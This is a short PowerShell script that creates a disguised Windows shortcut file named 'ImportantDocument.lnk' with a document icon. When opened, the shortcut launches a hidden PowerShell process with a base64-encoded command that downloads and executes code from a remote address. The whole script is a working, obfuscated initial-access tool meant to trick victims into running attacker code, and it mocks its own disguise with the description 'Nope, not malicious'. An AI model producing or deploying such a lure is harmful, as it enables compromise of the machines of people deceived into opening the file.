$payload="IEX ((new-object net.webclient).downloadstring('http://XXX.XXX.XX.XX:80/a'))"
$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

$path=".\ImportantDocument.lnk"
$wshell = New-Object -ComObject Wscript.Shell
$shortcut = $wshell.CreateShortcut($path)

$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,70"

$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-nop -w hidden -enc $ENCODED"
$shortcut.WorkingDirectory = "C:"
$shortcut.Description = "Nope, not malicious"

$shortcut.WindowStyle = 7

$shortcut.Save()
